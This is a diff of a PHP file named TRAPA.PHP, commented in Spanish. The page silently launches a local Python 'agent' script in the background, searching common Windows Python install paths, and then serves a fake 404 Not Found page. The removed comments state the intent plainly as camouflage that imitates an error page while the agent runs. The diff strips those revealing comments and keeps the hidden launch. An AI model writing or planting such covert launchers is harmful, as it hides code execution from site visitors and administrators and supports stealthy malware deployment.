@@ -1,26 +1,40 @@
 <?php
 /**
- * TRAPA.PHP - Lanzador simulado
- * Este script simula una página de error 404 mientras ejecuta 
- * el agente en segundo plano.
+ * TRAPA.PHP - Lanzador Automático
  */
 
-// 1. Definir la ruta absoluta al agente
-// __DIR__ nos da la ruta de la carpeta 'server'
-// '/../client/agente.py' sube un nivel y entra en 'client'
 $agente_path = __DIR__ . '/../client/agente.py';
 
-// 2. Ejecutar el agente de forma silenciosa y en segundo plano
+function buscarPython() {
+    // Rutas comunes de instalación en Windows
+    $posibles_rutas = [
+        "python", // Intento global
+        "C:\\Python312\\python.exe",
+        "C:\\Python311\\python.exe",
+        "C:\\Python310\\python.exe",
+        "C:\\Python39\\python.exe",
+        "C:\\Program Files\\Python312\\python.exe",
+        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python312\\python.exe",
+        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python311\\python.exe",
+        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python310\\python.exe",
+        getenv('LOCALAPPDATA') . "\\Programs\\Python\\Python39\\python.exe",
+    ];
+
+    foreach ($posibles_rutas as $ruta) {
+        // Verificamos si el archivo existe o si el comando responde
+        if (file_exists($ruta)) return $ruta;
+    }
+    return "python"; // Por defecto si no encuentra nada
+}
+
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-    // Comando para Windows: lanza el proceso sin esperar a que termine (B)
-    // Usamos 'pythonw' si quieres que sea totalmente invisible
-    pclose(popen("start /B python \"$agente_path\"", "r"));
+    $python = buscarPython();
+    // Ejecución en segundo plano sin ventana
+    pclose(popen("start /B $python \"$agente_path\"", "r"));
 } else {
-    // Comando para Linux/Mac
     exec("python3 \"$agente_path\" > /dev/null 2>&1 &");
 }
 
-// 3. Camuflaje: Mostrar un error 404 estándar
 header("HTTP/1.1 404 Not Found");
 ?>
 <!DOCTYPE html>
